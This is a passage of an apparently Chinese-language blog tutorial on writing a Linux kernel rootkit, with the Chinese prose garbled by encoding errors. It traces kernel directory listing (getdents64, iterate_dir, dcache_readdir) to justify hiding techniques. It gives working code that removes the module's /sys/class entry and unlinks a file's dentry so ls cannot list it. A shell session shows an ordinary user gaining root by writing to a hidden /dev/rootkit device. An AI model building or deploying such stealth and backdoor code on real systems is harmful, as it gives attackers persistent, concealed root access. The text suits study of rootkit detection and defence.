class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">class_destroy</span><span class="params">(struct class *cls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((cls == <span class="literal">NULL</span>) || (IS_ERR(cls)))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	class_unregister(cls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç²—ç•¥çš„æŸ¥çœ‹ä¸€ä¸‹<code>class_destroy</code>çš„åŸºæœ¬æµç¨‹ä¼šå‘ç°å…¶æ˜¯é€šè¿‡<code>kobject_del</code>å‡½æ•°è¿›è¡Œåˆ é™¤çš„ï¼Œæ‰€ä»¥è¿™é‡Œå…¶å®å¯ä»¥å’Œ<code>/sys/module/</code>è¿›è¡Œéšè—æ—¶çš„æ“ä½œä¸€æ ·å³å¯ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;(((struct kset *)module_class-&gt;p)-&gt;kobj));</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/class/ | grep rootkit</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå®ç°éšè—ã€‚</p>
<h3 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h3><p>åœ¨å‰æ–‡ä¸­ï¼Œåœ¨åˆ›å»ºè®¾å¤‡åå¯ä»¥åœ¨<code>/dev</code>ç›®å½•ä¸­çœ‹åˆ°è®¾å¤‡ï¼Œå¹¶ä¸”æˆ‘ä»¬çš„rootkitéœ€è¦é•¿æœŸé©»ç•™åœ¨ç³»ç»Ÿä¸­ï¼Œå¦‚æœæƒ³æ¯ä¸€æ¬¡å¼€æœºéƒ½è‡ªåŠ¨è½½å…¥æˆ‘ä»¬çš„rootkitï¼Œè¿™ä¹Ÿå°±è¦æ±‚æˆ‘ä»¬çš„rootkitæ–‡ä»¶è¿˜éœ€è¦ä¿ç•™åœ¨ç³»ç»Ÿä¸­ã€‚æ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦æˆ‘ä»¬è¿›è¡Œæ–‡ä»¶éšè—äº†ã€‚</p>
<p>åœ¨linuxä¸­æˆ‘ä»¬æœ€å¸¸ç”¨çš„ä¾¿åˆ©æ–‡ä»¶å¤¹çš„å‘½ä»¤æ˜¯<code>ls</code>ï¼Œè¿™é‡Œè¿½è¸ªä¸€ä¸‹<code>ls</code>æ‰€ä½¿ç”¨äº†ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;.&quot;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = <span class="number">3</span></span><br><span class="line">fstat(<span class="number">3</span>, &#123;st_mode=S_IFDIR|<span class="number">0755</span>, st_size=<span class="number">832</span>, ...&#125;) = <span class="number">0</span></span><br><span class="line">getdents64(<span class="number">3</span>, <span class="comment">/* 26 entries */</span>, <span class="number">32768</span>)  = <span class="number">904</span></span><br><span class="line">getdents64(<span class="number">3</span>, <span class="comment">/* 0 entries */</span>, <span class="number">32768</span>)   = <span class="number">0</span></span><br><span class="line">close(<span class="number">3</span>)                                = <span class="number">0</span></span><br><span class="line">fstat(<span class="number">1</span>, &#123;st_mode=S_IFCHR|<span class="number">0620</span>, st_rdev=makedev(<span class="number">0x88</span>, <span class="number">0</span>), ...&#125;) = <span class="number">0</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;busybox-1.36.1\texp.c  linux-5.11&quot;</span>..., <span class="number">189b</span>usybox<span class="number">-1.36</span><span class="number">.1</span>	<span class="built_in">exp</span>.c  linux<span class="number">-5.11</span>  Makefile  modules.order  Module.symvers  rootfs  rootfs.cpio  rootkit.c  rootkit.ko	rootkit.mod  rootkit.mod.c  rootkit.mod.o  rootkit.o  x</span><br><span class="line">) = <span class="number">189</span></span><br><span class="line">close(<span class="number">1</span>)                                = <span class="number">0</span></span><br><span class="line">close(<span class="number">2</span>)                                = <span class="number">0</span></span><br><span class="line">exit_group(<span class="number">0</span>)                           = ?</span><br><span class="line">+++ exited with <span class="number">0</span> +++</span><br></pre></td></tr></table></figure>

<p>å‰é¢å¤§å¤šæ˜¯glibcåº“çš„è®¸å¤šç³»ç»Ÿè°ƒç”¨æ¯”å¦‚åˆ›å»ºå†…å­˜ç­‰æ‰€ä»¥è¿™é‡Œçœç•¥äº†ï¼Œä»è¿™é‡Œå¼€å§‹ï¼Œèƒ½å¤Ÿæ³¨æ„åˆ°çš„æ˜¯è¿™é‡Œå­˜åœ¨<code>getdents64</code>è¿™æ ·ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(getdents64, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd,</span><br><span class="line">		struct linux_dirent64 __user *, dirent, <span class="keyword">unsigned</span> <span class="keyword">int</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">getdents_callback64</span> <span class="title">buf</span> =</span> &#123;</span><br><span class="line">		.ctx.actor = filldir64,</span><br><span class="line">		.count = count,</span><br><span class="line">		.current_dir = dirent</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">	f = fdget_pos(fd);</span><br><span class="line">	<span class="keyword">if</span> (!f.file)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">	error = iterate_dir(f.file, &amp;buf.ctx);</span><br><span class="line">	<span class="keyword">if</span> (error &gt;= <span class="number">0</span>)</span><br><span class="line">		error = buf.error;</span><br><span class="line">	<span class="keyword">if</span> (buf.prev_reclen) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> __<span class="title">user</span> * <span class="title">lastdirent</span>;</span></span><br><span class="line">		typeof(lastdirent-&gt;d_off) d_off = buf.ctx.pos;</span><br><span class="line"></span><br><span class="line">		lastdirent = (<span class="keyword">void</span> __user *) buf.current_dir - buf.prev_reclen;</span><br><span class="line">		<span class="keyword">if</span> (put_user(d_off, &amp;lastdirent-&gt;d_off))</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			error = count - buf.count;</span><br><span class="line">	&#125;</span><br><span class="line">	fdput_pos(f);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å†…æ ¸ä¸­æŸ¥çœ‹å…¶æºç å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥å‰é¢ä¼ å…¥çš„3å³<code>openat</code>å½“å‰ç›®å½•æ‰€å¾—åˆ°çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p>å›åˆ°ä¸Šè¿°ä»£ç ï¼Œå…¶ä¸­çš„<code>fdget_pos</code>å‡½æ•°å’Œ<code>fdput_pos</code>å‡½æ•°å¯¹åº”çš„æ˜¯å¯¹æ–‡ä»¶æè¿°ç¬¦è¿›è¡ŒåŠ é”å’Œè§£é”çš„æ“ä½œï¼Œè¿™é‡Œä¸»è¦çš„å®ç°å‡½æ•°æ˜¯<code>iterate_dir</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">iterate_dir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);</span><br><span class="line">	<span class="keyword">bool</span> shared = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> res = -ENOTDIR;</span><br><span class="line">	<span class="keyword">if</span> (file-&gt;f_op-&gt;iterate_shared)</span><br><span class="line">		shared = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (!file-&gt;f_op-&gt;iterate)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	res = security_file_permission(file, MAY_READ);</span><br><span class="line">	<span class="keyword">if</span> (res)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (shared)</span><br><span class="line">		res = down_read_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		res = down_write_killable(&amp;inode-&gt;i_rwsem);</span><br><span class="line">	<span class="keyword">if</span> (res)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	res = -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (!IS_DEADDIR(inode)) &#123;</span><br><span class="line">		ctx-&gt;pos = file-&gt;f_pos;</span><br><span class="line">		<span class="keyword">if</span> (shared)</span><br><span class="line">			res = file-&gt;f_op-&gt;iterate_shared(file, ctx);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			res = file-&gt;f_op-&gt;iterate(file, ctx);</span><br><span class="line">		file-&gt;f_pos = ctx-&gt;pos;</span><br><span class="line">		fsnotify_access(file);</span><br><span class="line">		file_accessed(file);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (shared)</span><br><span class="line">		inode_unlock_shared(inode);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		inode_unlock(inode);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(iterate_dir)</span><br></pre></td></tr></table></figure>

<p>Linuxç³»ç»Ÿå¯ä»¥é€‚ç”¨äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿçš„åŸå› å°±æ˜¯ä¸­é—´å­˜åœ¨ä¸€å±‚VFSå±‚ï¼Œåœ¨å†…æ ¸ä¸­ä½¿ç”¨<code>file</code>ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€å¼ å‡½æ•°è¡¨ <code>file_operations</code> å‡½æ•°è¡¨å¯¹åº”ç›¸åº”çš„å¯¹è¯¥æ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼ˆä¾‹å¦‚ readã€writeï¼‰ï¼Œè¯¥å‡½æ•°è¡¨å–è‡ªè¯¥æ–‡ä»¶å¯¹åº”çš„ inodeï¼Œæœ€ç»ˆå–è‡ªç›¸åº”çš„æ–‡ä»¶ç³»ç»Ÿæä¾›çš„å…·ä½“å‡½æ•°ï¼Œåœ¨è¿™é‡Œä¼šè°ƒç”¨è¡¨ä¸­çš„å‡½æ•°æŒ‡é’ˆ <code>iterate_shared</code> æˆ– <code>iterate</code>ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20240216143807039.png"
                      alt="image-20240216143807039"
                ></p>
<p>ä½¿ç”¨gdbç®€å•è°ƒè¯•å‘ç°Linux-5.10ç‰ˆæœ¬å†…æ ¸ä¼šè°ƒç”¨<code>interate_shared</code>å‡½æ•°ï¼Œç»§ç»­è°ƒè¯•ä¼šå‘ç°å…¶æœ€ç»ˆè°ƒç”¨<code>dcache_readdir</code>å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dcache_readdir</span><span class="params">(struct file *file, struct dir_context *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span> =</span> file-&gt;f_path.dentry;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">cursor</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">anchor</span> =</span> &amp;dentry-&gt;d_subdirs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">next</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!dir_emit_dots(file, ctx))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;pos == <span class="number">2</span>)</span><br><span class="line">		p = anchor;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (!list_empty(&amp;cursor-&gt;d_child))</span><br><span class="line">		p = &amp;cursor-&gt;d_child;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((next = scan_positives(cursor, p, <span class="number">1</span>, next)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!dir_emit(ctx, next-&gt;d_name.name, next-&gt;d_name.len,</span><br><span class="line">			      d_inode(next)-&gt;i_ino, dt_type(d_inode(next))))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		ctx-&gt;pos++;</span><br><span class="line">		p = &amp;next-&gt;d_child;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line">	<span class="keyword">if</span> (next)</span><br><span class="line">		list_move_tail(&amp;cursor-&gt;d_child, &amp;next-&gt;d_child);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		list_del_init(&amp;cursor-&gt;d_child);</span><br><span class="line">	spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">	dput(next);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(dcache_readdir);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯å‡½æ•°å†…éƒ¨ä¼šé€šè¿‡<code>scan_positives</code>è¿›è¡Œéå†è·å¾—nextï¼Œæœ€åé€šè¿‡<code>dir_emit</code>æäº¤ç»™vfså±‚ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct dentry *<span class="title">scan_positives</span><span class="params">(struct dentry *cursor,</span></span></span><br><span class="line"><span class="params"><span class="function">					struct list_head *p,</span></span></span><br><span class="line"><span class="params"><span class="function">					<span class="keyword">loff_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">					struct dentry *last)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span> =</span> cursor-&gt;d_parent, *found = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line">	<span class="keyword">while</span> ((p = p-&gt;next) != &amp;dentry-&gt;d_subdirs) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d</span> =</span> list_entry(p, struct dentry, d_child);</span><br><span class="line">		<span class="comment">// we must at least skip cursors, to avoid livelocks</span></span><br><span class="line">		<span class="keyword">if</span> (d-&gt;d_flags &amp; DCACHE_DENTRY_CURSOR)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> (simple_positive(d) &amp;&amp; !--count) &#123;</span><br><span class="line">			spin_lock_nested(&amp;d-&gt;d_lock, DENTRY_D_LOCK_NESTED);</span><br><span class="line">			<span class="keyword">if</span> (simple_positive(d))</span><br><span class="line">				found = dget_dlock(d);</span><br><span class="line">			spin_unlock(&amp;d-&gt;d_lock);</span><br><span class="line">			<span class="keyword">if</span> (likely(found))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			count = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (need_resched()) &#123;</span><br><span class="line">			list_move(&amp;cursor-&gt;d_child, p);</span><br><span class="line">			p = &amp;cursor-&gt;d_child;</span><br><span class="line">			spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">			cond_resched();</span><br><span class="line">			spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">	dput(last);</span><br><span class="line">	<span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å¯¹<code>scan_positives</code>å‡½æ•°çš„åˆ†æä¼šå‘ç°å…¶é¦–å…ˆ<code>(p = p-&gt;next) != &amp;dentry-&gt;d_subdirs</code>åˆ¤æ–­æ˜¯å¦å·²ç»éå†åˆ°æœ¬èº«ï¼Œéšåé€šè¿‡<code>list_entry</code>å®è·å¾—æœ€ç»ˆçš„<code>dentry</code>å¹¶è¿”å›çš„ï¼Œè¿™é‡Œä½¿ç”¨çš„<code>dentry</code>ä¸­çš„<code>d_child</code>æˆå‘˜ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line">	<span class="comment">/* RCU lookup touched fields */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;		<span class="comment">/* protected by d_lock */</span></span><br><span class="line">	<span class="keyword">seqcount_spinlock_t</span> d_seq;	<span class="comment">/* per dentry seqlock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_hash</span>;</span>	<span class="comment">/* lookup hash list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span>	<span class="comment">/* parent directory */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span>		<span class="comment">/* Where the name belongs to - NULL is</span></span><br><span class="line"><span class="comment">					 * negative */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN];	<span class="comment">/* small names */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Ref lookup also touches following */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockref</span> <span class="title">d_lockref</span>;</span>	<span class="comment">/* per-dentry lock and refcount */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span>	<span class="comment">/* The root of the dentry tree */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;		<span class="comment">/* used by d_revalidate */</span></span><br><span class="line">	<span class="keyword">void</span> *d_fsdata;			<span class="comment">/* fs-specific data */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span>		<span class="comment">/* LRU list */</span></span><br><span class="line">		<span class="keyword">wait_queue_head_t</span> *d_wait;	<span class="comment">/* in-lookup ones only */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span>	<span class="comment">/* child of parent list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span>	<span class="comment">/* our children */</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * d_alias and d_rcu can share memory</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_alias</span>;</span>	<span class="comment">/* inode alias list */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_in_lookup_hash</span>;</span>	<span class="comment">/* only for in-lookup ones */</span></span><br><span class="line">	 	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">	&#125; d_u;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>å¯èƒ½å‰é¢ç›´æ¥è¯´<code>dentry</code>ç»“æ„ä½“ä¼šæ¯”è¾ƒæ¨¡ç³Šï¼Œæœ€å¥½ç»“åˆç€è¿™ä¸ªç»“æ„ä½“ä»¥åŠæ³¨é‡Šæ¥çœ‹ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20240216153243832.png"
                      alt="image-20240216153243832"
                ></p>
<p>ç»“åˆä¸Šå›¾ç›¸ä¿¡å¤§å®¶å¯ä»¥å¾ˆå¿«çš„ç†è§£åˆ°äº†ã€‚</p>
<p>æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶çš„<code>dentry</code>ä»å…¶<code>d_child</code>é“¾è¡¨ä¸­è„±é“¾ï¼Œå°±èƒ½å¤Ÿå®ç°éšè—æ“ä½œäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">tagret_file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">target_dentry</span>;</span></span><br><span class="line"></span><br><span class="line">    tagret_file = filp_open(filename, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR(tagret_file))</span><br><span class="line">    &#123;</span><br><span class="line">        target_dentry = tagret_file-&gt;f_path.dentry;</span><br><span class="line"></span><br><span class="line">        target_dentry-&gt;d_child.next-&gt;prev = target_dentry-&gt;d_child.prev;</span><br><span class="line">        target_dentry-&gt;d_child.prev-&gt;next = target_dentry-&gt;d_child.next;</span><br><span class="line"></span><br><span class="line">        filp_close(tagret_file, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡ä¸Šè¿°ä»£ç å®ç°è„±é“¾æ“ä½œã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ ls</span><br><span class="line">bin          home         lib64        root         sys</span><br><span class="line">dev          init         linuxrc      rootfs.cpio  usr</span><br><span class="line">etc          lib          proc         sbin</span><br><span class="line">~ $ ls /dev/ | grep rootkit</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># find /dev/ -name &quot;rootkit&quot;</span></span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin          home         lib64        root         sys</span><br><span class="line">dev          init         linuxrc      rootfs.cpio  usr</span><br><span class="line">etc          lib          proc         sbin</span><br><span 